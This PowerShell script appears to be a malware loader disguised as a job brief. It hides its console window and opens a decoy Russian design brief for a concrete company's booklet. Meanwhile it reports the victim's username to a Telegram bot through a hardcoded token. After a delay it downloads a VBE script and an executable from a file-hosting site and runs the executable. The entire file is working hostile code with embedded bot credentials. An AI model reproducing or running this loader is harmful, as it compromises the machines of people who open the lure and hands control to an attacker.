Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
$v0=[b0.a0]::GetConsoleWindow()
[b0.a0]::ShowWindow($v0,0)
$v1="ТЗ_Дизайн_Буклета_Пробетон34.txt"
$v2=Join-Path $env:LOCALAPPDATA $v1
$v3=@"
ЗАДАЧА: Сделать дизайн буклета для печати. Стиль — брутализм.
Цель — привлечение клиентов (частные застройщики, строительные компании).
Буклет евроформат: 297×210 мм (А4), сложение в 3 части
Разрешение 300 dpi, CMYK, вылеты 3 мм.
Файлы: PDF для печати + исходники (AI/PSD).
Фон: тёмно-синий #1A1A2E
Акцент: золотисто-жёлтый #D4A84B
Текст: белый
Кнопки: синий #3B5998

Обложка:
логотип ПРОБЕТОН34
слоган «С нами строить легко!»
фото работ (в папке исходники)

Внутри:
услуги: фундаменты, бетонные работы, земляные работы, металлоконструкции, реконструкция
преимущества: 13+ лет на рынке, 150+ проектов, гарантия качества
2-4 фото выполненных работ

Задняя сторона (брать с сайта):
контакты (телефон, email, адрес, сайт)
график работы
QR-код на сайт (сделайте сами)
"Закажите бесплатную консультацию!"

Срок: 4 рабочих дня!
Стоимость: 6 000 руб!
Компания: ПРОБЕТОН34
Сфера: бетонные работы, строительство фундаментов
Регион: Волгоград, Волжский
Email: info@probeton34.ru
Адрес: г. Волжский, ул. им. Генерала Карбышева, 166, офис 5
Сайт: probeton34.ru
"@
$v3|Out-File -FilePath $v2 -Encoding UTF8
Invoke-Item $v2
$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$v5="7063407604"
$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$v7="The user's shortcut was enabled for user: "+$v6
$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
Start-Sleep -Seconds 400
$v11="https://www.udrop.com/file/Od75/1446062403_house.delete"
$v12="1446062403_house.vbe"
$v13=[Environment]::GetFolderPath("LocalApplicationData")
$v14=Join-Path $v13 $v12
try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
$v17="1446062403_key.exe"
$v18=Join-Path $v13 $v17
try{
    $v19=New-Object System.Net.WebClient
    $v19.DownloadFile($v16,$v18)
    Start-Process -FilePath $v18 -WindowStyle Normal
}catch{}
exit